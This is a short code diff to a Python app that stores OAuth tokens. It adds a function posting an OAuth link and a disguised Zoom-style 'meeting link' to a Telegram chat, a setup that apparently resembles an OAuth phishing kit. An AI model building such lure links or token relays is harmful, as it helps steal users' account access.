@@ -36,6 +36,33 @@ def init_db():
 init_db()  # Ensure the database is initialized when the app starts
 
 # Store token in the database
+# Function to send a startup message with OAuth link and meeting link
+def send_startup_message():
+    state = "0"  # Fixed state value for initialization
+    code_verifier, code_challenge = generate_code_verifier_and_challenge()
+    
+    # Generate the OAuth link
+    authorization_url = CALLBACK_URL
+
+    # Generate the meeting link
+    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"
+    
+    # Message content
+    message = (
+        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
+        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
+    )
+    
+    # Send the message to Telegram
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    data = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": message,
+        "parse_mode": "Markdown"
+    }
+    requests.post(url, json=data)
+
+# Store token in the database
 def store_token(access_token, refresh_token, username):
     conn = sqlite3.connect(DATABASE)
     cursor = conn.cursor()
